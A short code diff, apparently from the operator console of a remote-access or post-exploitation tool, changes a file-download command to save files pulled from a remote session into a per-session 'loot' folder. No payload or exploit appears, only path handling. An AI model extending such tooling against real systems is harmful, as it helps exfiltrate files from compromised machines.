@@ -130,7 +130,10 @@ class Commander(object):
                         else:
                             rfile_path = command.split()[1]
                             if len(command.split()) == 2:
-                                lfile_path = '{0}/{1}'.format(getcwd(), rfile_path.split('/')[-1])
+                                lfile_path = '{0}/loot/{1}{2}'.format(getcwd(),info.session, rfile_path)
+                                lfolder = '/'.join(lfile_path.split('/')[:-1])
+                                import os
+                                if not os.path.exists(lfolder): os.makedirs(lfolder)
                             else:
                                 lfile_path = command.split()[2]
                             file_handler.download_file(rfile_path, lfile_path)
